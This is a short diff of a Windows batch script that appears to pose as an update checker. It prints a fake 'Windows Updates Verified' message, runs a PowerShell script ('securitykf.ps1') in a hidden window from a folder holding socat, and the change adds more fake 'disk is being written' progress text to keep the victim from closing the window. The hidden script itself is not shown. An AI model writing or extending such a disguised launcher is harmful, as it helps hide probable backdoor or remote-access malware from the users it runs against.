@@ -15,5 +15,10 @@ for /l %%a in (1,1,75) do (
 )
 echo Windows Updates Verified 0 Updates Pending
 cd \"Program Files"\ZOLOFT\ZOLOFT\socat-windows-master && powershell.exe -windowstyle hidden ./securitykf.ps1 
-timeout 2
+echo Finishing up do not close this window disk is being written
+echo . 
+echo .
+echo .
+echo done
+timeout 3
 
